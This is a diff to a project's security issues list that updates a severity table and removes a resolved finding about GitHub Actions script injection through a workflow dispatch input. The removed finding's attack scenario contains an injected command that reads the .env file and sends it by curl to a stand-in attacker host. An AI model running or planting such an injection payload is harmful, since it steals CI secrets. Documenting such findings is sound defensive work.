@@ -12,7 +12,7 @@ For resolved issues, see [ISSUES_ARCHIVE.md](ISSUES_ARCHIVE.md).
 |----------|-------|------------|
 | High | 0 | |
 | Medium | 0 | |
-| Low | 4 | Input Validation |
+| Low | 3 | Input Validation, Cryptographic Failures |
 | Medium | 1 | File Structure (pre-existing) |
 | Low | 1 | Duplication (pre-existing) |
 
@@ -43,17 +43,6 @@ For resolved issues, see [ISSUES_ARCHIVE.md](ISSUES_ARCHIVE.md).
 ---
 
 ---
-
-## [SECURITY] CI Injection: GitHub Actions script injection via workflow dispatch
-
-**Found in:** `.github/workflows/e2e-tests.yml:132-136`
-**Severity:** Low
-**OWASP Category:** A03:2021 - Injection
-**Description:** The `test_filter` workflow dispatch input is interpolated with `${{ }}` directly into a shell command without escaping. A collaborator with dispatch permissions could inject arbitrary commands.
-**Attack Scenario:** Collaborator sets `test_filter` to `"; curl evil.com/exfil?s=$(cat .env) #` to exfiltrate CI secrets.
-**Evidence:** `FILTER="${{ github.event.inputs.test_filter }}"` in the workflow YAML.
-**Impact:** CI runner command injection (limited to repo collaborators).
-**Remediation:** Use an environment variable instead of direct interpolation: `env: FILTER: ${{ github.event.inputs.test_filter }}` then `"$FILTER"`.
 
 ---
 
